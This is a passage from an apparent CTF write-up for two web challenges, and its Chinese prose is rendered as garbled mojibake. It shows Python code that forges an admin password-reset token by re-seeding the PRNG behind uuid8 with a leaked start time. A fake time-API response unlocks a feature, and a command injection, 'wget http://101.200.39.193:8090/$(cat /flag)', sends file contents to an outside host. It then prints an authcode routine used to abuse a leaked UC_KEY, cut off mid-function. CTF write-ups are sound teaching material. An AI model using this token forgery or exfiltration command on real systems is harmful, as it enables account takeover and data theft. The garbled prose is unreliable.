<p>æ„æ€å°±æ˜¯é»˜è®¤æƒ…å†µä¸‹**<code>uuid8()</code>å‡½æ•°ä¸­çš„å‚æ•° <code>a</code>ã€<code>b</code>ã€<code>c</code>æ˜¯é€šè¿‡æ™®é€šçš„ä¼ªéšæœºæ•°ç”Ÿæˆå™¨ï¼ˆ<code>random.getrandbits()</code>ï¼‰ç”Ÿæˆçš„ï¼Œè€Œéå¯†ç å­¦å®‰å…¨çš„ä¼ªéšæœºæ•°ç”Ÿæˆå™¨ï¼ˆCSPRNGï¼‰ã€‚**æ‰€ä»¥é¢˜ç›®ç»™çš„ä»£ç å¼€å¤´æç¤ºå°±æœ‰äº†ä½œç”¨</p>
<p><img src="/p/2025-lilctf/image-20250905175023405.png"
	width="866"
	height="150"
	srcset="/p/2025-lilctf/image-20250905175023405_hu_a305c0e090a52ce.png 480w, /p/2025-lilctf/image-20250905175023405_hu_4afeca8aef292b5d.png 1024w"
	loading="lazy"
	
		alt="image-20250905175023405"
	
	
		class="gallery-image" 
		data-flex-grow="577"
		data-flex-basis="1385px"
	
></p>
<p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è®¿é—®/server_infoå¾—åˆ°ç§å­<code>SERVER_START_TIME</code>ç„¶åå°±å¯ä»¥é¢„æµ‹tokenäº†ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/server_info&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nd">@login_required</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">server_info</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;server_start_time&#39;</span><span class="p">:</span> <span class="n">SERVER_START_TIME</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;current_time&#39;</span><span class="p">:</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ‰€ä»¥ä¼ªé€ tokençš„ä»£ç å°±æ˜¯</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">uuid</span>
</span></span><span class="line"><span class="cl"><span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="mf">1754662952.3222806</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">padding</span><span class="p">(</span><span class="n">input_string</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">byte_string</span> <span class="o">=</span> <span class="n">input_string</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">byte_string</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">6</span><span class="p">:</span> <span class="n">byte_string</span> <span class="o">=</span> <span class="n">byte_string</span><span class="p">[:</span><span class="mi">6</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">padded_byte_string</span> <span class="o">=</span> <span class="n">byte_string</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">padded_int</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">padded_byte_string</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s1">&#39;big&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">padded_int</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid8</span><span class="p">(</span><span class="n">a</span><span class="o">=</span><span class="n">padding</span><span class="p">(</span><span class="s1">&#39;admin&#39;</span><span class="p">)))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä½†æ˜¯uuid8å‡½æ•°æœ€å°‘è¦python3.14ç‰ˆæœ¬ä»¥ä¸Šï¼Œä¸‹è½½ä¸€ä¸‹ã€‚<a class="link" href="https://www.rjctx.com/55911.html"  target="_blank" rel="noopener"
    >Python 3.14å®˜æ–¹ç‰ˆå®‰è£…åŒ…ä¸‹è½½ - è€ƒæ‹‰è½¯ä»¶</a>ï¼Œè¿˜æ˜¯è¿è¡Œä¸äº†ï¼Œå°±ç›´æ¥å»æ‰¾uuid8çš„æºç ï¼Œå»https://github.com/python/cpythonæ‰¾ï¼Œå¾—åˆ°å¦‚ä¸‹ï¼ˆçœ‹æºç çŸ¥é“tokenå®Œå…¨ç”±<code>random.getrandbits()</code>ç”Ÿæˆï¼Œä¹Ÿå°è¯äº†ä¹‹å‰è¯´çš„æˆ‘ä»¬å¯ä»¥é¢„æµ‹å‡ºè¿™ä¸ªtokenäº†ã€‚ï¼‰</p>
<p><img src="/p/2025-lilctf/image-20250905194656667.png"
	width="1568"
	height="903"
	srcset="/p/2025-lilctf/image-20250905194656667_hu_dcfea0a6c6b6d4ff.png 480w, /p/2025-lilctf/image-20250905194656667_hu_ba33fb9fe2c1fc00.png 1024w"
	loading="lazy"
	
		alt="image-20250905194656667"
	
	
		class="gallery-image" 
		data-flex-grow="173"
		data-flex-basis="416px"
	
></p>
<p>ç›´æ¥å¤åˆ¶ä¸Šå»æœ‰ç‚¹ä¸å¯¹ï¼Œaiæ”¹ä¸€ä¸‹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">uuid</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="mf">1757072990.0011806</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">padding</span><span class="p">(</span><span class="n">input_string</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">byte_string</span> <span class="o">=</span> <span class="n">input_string</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">byte_string</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">6</span><span class="p">:</span> 
</span></span><span class="line"><span class="cl">        <span class="n">byte_string</span> <span class="o">=</span> <span class="n">byte_string</span><span class="p">[:</span><span class="mi">6</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">padded_byte_string</span> <span class="o">=</span> <span class="n">byte_string</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">padded_int</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">padded_byte_string</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s1">&#39;big&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">padded_int</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">uuid8</span><span class="p">(</span><span class="n">a</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">b</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">c</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Generate a UUID from three custom blocks.
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">    * &#39;a&#39; is the first 48-bit chunk of the UUID (octets 0-5);
</span></span></span><span class="line"><span class="cl"><span class="s2">    * &#39;b&#39; is the mid 12-bit chunk (octets 6-7);
</span></span></span><span class="line"><span class="cl"><span class="s2">    * &#39;c&#39; is the last 62-bit chunk (octets 8-15).
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">    When a value is not specified, a pseudo-random value is generated.
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">a</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">a</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="mi">48</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">b</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">b</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">c</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">c</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="mi">62</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># Combine the bits into a 128-bit integer</span>
</span></span><span class="line"><span class="cl">    <span class="n">int_uuid</span> <span class="o">=</span> <span class="p">(</span><span class="n">a</span> <span class="o">&amp;</span> <span class="mh">0xFFFF_FFFF_FFFF</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">80</span>
</span></span><span class="line"><span class="cl">    <span class="n">int_uuid</span> <span class="o">|=</span> <span class="p">(</span><span class="n">b</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">64</span>
</span></span><span class="line"><span class="cl">    <span class="n">int_uuid</span> <span class="o">|=</span> <span class="p">(</span><span class="n">c</span> <span class="o">&amp;</span> <span class="mh">0x3FFF_FFFF_FFFF_FFFF</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># Set the version (8) and variant (RFC 4122)</span>
</span></span><span class="line"><span class="cl">    <span class="n">int_uuid</span> <span class="o">|=</span> <span class="p">(</span><span class="mh">0x8</span> <span class="o">&lt;&lt;</span> <span class="mi">76</span><span class="p">)</span>  <span class="c1"># Version 8</span>
</span></span><span class="line"><span class="cl">    <span class="n">int_uuid</span> <span class="o">|=</span> <span class="p">(</span><span class="mh">0x2</span> <span class="o">&lt;&lt;</span> <span class="mi">62</span><span class="p">)</span>  <span class="c1"># Variant 2 (RFC 4122)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># Use the public constructor instead of _from_int</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">uuid</span><span class="o">.</span><span class="n">UUID</span><span class="p">(</span><span class="nb">int</span><span class="o">=</span><span class="n">int_uuid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Test</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">uuid8</span><span class="p">(</span><span class="n">a</span><span class="o">=</span><span class="n">padding</span><span class="p">(</span><span class="s1">&#39;admin&#39;</span><span class="p">)))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åè¾“å…¥tokené‡ç½®å¯†ç ï¼ŒæˆåŠŸç™»å…¥</p>
<p><img src="/p/2025-lilctf/image-20250905200320027.png"
	width="1457"
	height="455"
	srcset="/p/2025-lilctf/image-20250905200320027_hu_3a01888d4de0fb91.png 480w, /p/2025-lilctf/image-20250905200320027_hu_cb6c17ff9892b128.png 1024w"
	loading="lazy"
	
		alt="image-20250905200320027"
	
	
		class="gallery-image" 
		data-flex-grow="320"
		data-flex-basis="768px"
	
></p>
<p>æ¥ä¸‹æ¥å°±æ›´æ–°api</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">check_time_api</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">user</span><span class="o">.</span><span class="n">time_api</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">datetime_str</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;date&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">datetime_str</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">datetime_str</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">current_time</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">fromisoformat</span><span class="p">(</span><span class="n">datetime_str</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">current_time</span><span class="o">.</span><span class="n">year</span> <span class="o">&gt;=</span> <span class="mi">2066</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">None</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è§‚å¯Ÿè¿™ä¸ªå¹´ä»½æ˜¯ç”±dataæ•°æ®å†³å®šï¼Œå°±èµ·ä¸€ä¸ªapiï¼Œæä¾›json</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;date&#34;: &#34;2067-01-01T00:00:00&#34;}
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/2025-lilctf/image-20250905204905269.png"
	width="1104"
	height="389"
	srcset="/p/2025-lilctf/image-20250905204905269_hu_400f17b53140a08a.png 480w, /p/2025-lilctf/image-20250905204905269_hu_2c4c0da18b6c0228.png 1024w"
	loading="lazy"
	
		alt="image-20250905204905269"
	
	
		class="gallery-image" 
		data-flex-grow="283"
		data-flex-basis="681px"
	
></p>
<p>ç„¶åæ‰“</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">wget http://101.200.39.193:8090/$(cat /flag)
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/2025-lilctf/image-20250905212859767.png"
	width="1174"
	height="192"
	srcset="/p/2025-lilctf/image-20250905212859767_hu_192a01582a46669c.png 480w, /p/2025-lilctf/image-20250905212859767_hu_573c275f0698b2b3.png 1024w"
	loading="lazy"
	
		alt="image-20250905212859767"
	
	
		class="gallery-image" 
		data-flex-grow="611"
		data-flex-basis="1467px"
	
></p>
<p>éå¸¸éš¾ï¼Œå‡ºé¢˜äººè¿˜è¯´ç­¾åˆ°é¢˜ï¼Œè¿™uuid8çš„æºç éƒ½æ‰¾æ­»æˆ‘ã€‚</p>
<h2 id="æˆ‘æ›¾æœ‰ä¸€ä»½å·¥ä½œ">æˆ‘æ›¾æœ‰ä¸€ä»½å·¥ä½œ
</h2><p>æ‰«æå¾—www.zip,å®¡è®¡ä»£ç å‘ç°UC_KEYæ³„éœ²ï¼Œæœ‰äº†è¿™ä¸œè¥¿å°±å¯ä»¥è°ƒç”¨apiæ¥å£</p>
<p><img src="/p/2025-lilctf/image-20250906223016195.png"
	width="1160"
	height="611"
	srcset="/p/2025-lilctf/image-20250906223016195_hu_bb6db73b01ce3e76.png 480w, /p/2025-lilctf/image-20250906223016195_hu_678ad01ebe13556d.png 1024w"
	loading="lazy"
	
		alt="image-20250906223016195"
	
	
		class="gallery-image" 
		data-flex-grow="189"
		data-flex-basis="455px"
	
></p>
<p>é¢˜ç›®æç¤ºflag åœ¨ <code>pre_a_flag</code> è¡¨é‡Œï¼Œè¯´æ˜ç›®æ ‡å°±æ˜¯åœ¨æ•°æ®åº“ï¼Œç„¶åæˆ‘ä»¬å…¨å±€æœç´¢UC_KEY</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Get-ChildItem -Recurse | Select-String -Pattern &#34;UC_KEY&#34;		ï¼ˆåœ¨powershellæ‰“ï¼‰
</span></span></code></pre></td></tr></table>
</div>
</div><p>å‘ç°dbbak.phpæœ‰ç‚¹å¯èƒ½ï¼Œå®¡è®¡ä¸€ä¸‹</p>
<p><img src="/p/2025-lilctf/image-20250906214922921.png"
	width="1426"
	height="337"
	srcset="/p/2025-lilctf/image-20250906214922921_hu_85fac43e898dd615.png 480w, /p/2025-lilctf/image-20250906214922921_hu_2954ee6ef08fbe43.png 1024w"
	loading="lazy"
	
		alt="image-20250906214922921"
	
	
		class="gallery-image" 
		data-flex-grow="423"
		data-flex-basis="1015px"
	
></p>
<p>è¿™é‡Œä½¿ç”¨UC_KEYç”Ÿæˆçš„authcodeè¿›è¡Œæƒé™è®¤è¯ã€‚</p>
<p><img src="/p/2025-lilctf/image-20250906215251900.png"
	width="731"
	height="328"
	srcset="/p/2025-lilctf/image-20250906215251900_hu_45bc718015e27963.png 480w, /p/2025-lilctf/image-20250906215251900_hu_96594a4d32a9a65a.png 1024w"
	loading="lazy"
	
		alt="image-20250906215251900"
	
	
		class="gallery-image" 
		data-flex-grow="222"
		data-flex-basis="534px"
	
></p>
<p>åŠ å¯†å‡½æ•°</p>
<p><img src="/p/2025-lilctf/image-20250906215452394.png"
	width="618"
	height="209"
	srcset="/p/2025-lilctf/image-20250906215452394_hu_477f31f7b37e1954.png 480w, /p/2025-lilctf/image-20250906215452394_hu_b358f5acce2134e5.png 1024w"
	loading="lazy"
	
		alt="image-20250906215452394"
	
	
		class="gallery-image" 
		data-flex-grow="295"
		data-flex-basis="709px"
	
></p>
<p>å…³é”®è¯æœauthcodeæ‰¾åˆ°authcode`å‡½æ•°çš„å®ç°</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">_authcode</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span> <span class="nv">$operation</span> <span class="o">=</span> <span class="s1">&#39;DECODE&#39;</span><span class="p">,</span> <span class="nv">$key</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$expiry</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$ckey_length</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nv">$key</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$key</span> <span class="o">?</span> <span class="nv">$key</span> <span class="o">:</span> <span class="nx">UC_KEY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$keya</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$keyb</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$keyc</span> <span class="o">=</span> <span class="nv">$ckey_length</span> <span class="o">?</span> <span class="p">(</span><span class="nv">$operation</span> <span class="o">==</span> <span class="s1">&#39;DECODE&#39;</span> <span class="o">?</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$ckey_length</span><span class="p">)</span><span class="o">:</span> <span class="nx">substr</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nx">microtime</span><span class="p">()),</span> <span class="o">-</span><span class="nv">$ckey_length</span><span class="p">))</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nv">$cryptkey</span> <span class="o">=</span> <span class="nv">$keya</span><span class="o">.</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$keya</span><span class="o">.</span><span class="nv">$keyc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$key_length</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$cryptkey</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nv">$string</span> <span class="o">=</span> <span class="nv">$operation</span> <span class="o">==</span> <span class="s1">&#39;DECODE&#39;</span> <span class="o">?</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span> <span class="nv">$ckey_length</span><span class="p">))</span> <span class="o">:</span> <span class="nx">sprintf</span><span class="p">(</span><span class="s1">&#39;%010d&#39;</span><span class="p">,</span> <span class="nv">$expiry</span> <span class="o">?</span> <span class="nv">$expiry</span> <span class="o">+</span> <span class="nx">time</span><span class="p">()</span> <span class="o">:</span> <span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="nx">substr</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$string</span><span class="o">.</span><span class="nv">$keyb</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span><span class="o">.</span><span class="nv">$string</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$string_length</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$string</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nv">$result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$box</span> <span class="o">=</span> <span class="nx">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">255</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nv">$rndkey</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;=</span> <span class="mi">255</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$rndkey</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$cryptkey</span><span class="p">[</span><span class="nv">$i</span> <span class="o">%</span> <span class="nv">$key_length</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">for</span><span class="p">(</span><span class="nv">$j</span> <span class="o">=</span> <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$j</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$j</span> <span class="o">+</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">+</span> <span class="nv">$rndkey</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
